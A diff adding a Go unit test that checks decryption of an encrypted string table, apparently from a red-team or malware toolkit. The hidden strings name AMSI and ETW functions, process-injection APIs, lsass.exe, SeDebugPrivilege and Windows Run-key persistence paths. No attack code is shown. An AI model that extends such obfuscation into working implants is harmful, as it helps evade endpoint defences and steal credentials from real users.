@@ -184,6 +184,62 @@ func TestGenerateKeyZeroLength(t *testing.T) {
 	}
 }
 
+// TestTableAccessors verifies all pre-encrypted string table entries decrypt correctly
+func TestTableAccessors(t *testing.T) {
+	tests := []struct {
+		name     string
+		fn       func() string
+		expected string
+	}{
+		{"AmsiDll", AmsiDll, "amsi.dll"},
+		{"AmsiScanBuffer", AmsiScanBuffer, "AmsiScanBuffer"},
+		{"EtwEventWrite", EtwEventWrite, "EtwEventWrite"},
+		{"EtwEventRegister", EtwEventRegister, "EtwEventRegister"},
+		{"NtdllDll", NtdllDll, "ntdll.dll"},
+		{"Kernel32Dll", Kernel32Dll, "kernel32.dll"},
+		{"NtAllocateVirtualMemory", NtAllocateVirtualMemory, "NtAllocateVirtualMemory"},
+		{"NtWriteVirtualMemory", NtWriteVirtualMemory, "NtWriteVirtualMemory"},
+		{"NtProtectVirtualMemory", NtProtectVirtualMemory, "NtProtectVirtualMemory"},
+		{"NtCreateThreadEx", NtCreateThreadEx, "NtCreateThreadEx"},
+		{"NtFreeVirtualMemory", NtFreeVirtualMemory, "NtFreeVirtualMemory"},
+		{"NtOpenProcess", NtOpenProcess, "NtOpenProcess"},
+		{"NtClose", NtClose, "NtClose"},
+		{"NtReadVirtualMemory", NtReadVirtualMemory, "NtReadVirtualMemory"},
+		{"NtQueryInformationProcess", NtQueryInformationProcess, "NtQueryInformationProcess"},
+		{"NtResumeThread", NtResumeThread, "NtResumeThread"},
+		{"NtGetContextThread", NtGetContextThread, "NtGetContextThread"},
+		{"NtSetContextThread", NtSetContextThread, "NtSetContextThread"},
+		{"NtOpenThread", NtOpenThread, "NtOpenThread"},
+		{"NtQueueApcThread", NtQueueApcThread, "NtQueueApcThread"},
+		{"Advapi32Dll", Advapi32Dll, "advapi32.dll"},
+		{"VirtualAllocEx", VirtualAllocEx, "VirtualAllocEx"},
+		{"VirtualProtectEx", VirtualProtectEx, "VirtualProtectEx"},
+		{"WriteProcessMemory", WriteProcessMemory, "WriteProcessMemory"},
+		{"CreateRemoteThread", CreateRemoteThread, "CreateRemoteThread"},
+		{"ReadProcessMemory", ReadProcessMemory, "ReadProcessMemory"},
+		{"VirtualProtect", VirtualProtect, "VirtualProtect"},
+		{"OpenProcess", OpenProcess, "OpenProcess"},
+		{"SeDebugPrivilege", SeDebugPrivilege, "SeDebugPrivilege"},
+		{"RunKey", RunKey, `Software\Microsoft\Windows\CurrentVersion\Run`},
+		{"RunOnceKey", RunOnceKey, `Software\Microsoft\Windows\CurrentVersion\RunOnce`},
+		{"Powershell", Powershell, "powershell.exe"},
+		{"CmdExe", CmdExe, "cmd.exe"},
+		{"Lsass", Lsass, "lsass.exe"},
+		{"Winlogon", Winlogon, "winlogon.exe"},
+		{"WmiWin32Process", WmiWin32Process, "Win32_Process"},
+		{"WmiWin32Service", WmiWin32Service, "Win32_Service"},
+		{"WmiSelectFrom", WmiSelectFrom, "SELECT * FROM "},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			got := tt.fn()
+			if got != tt.expected {
+				t.Errorf("%s() = %q, want %q", tt.name, got, tt.expected)
+			}
+		})
+	}
+}
+
 func BenchmarkDecrypt(b *testing.B) {
 	key := []byte("benchmark-key-16")
 	plain := "VirtualAllocEx"
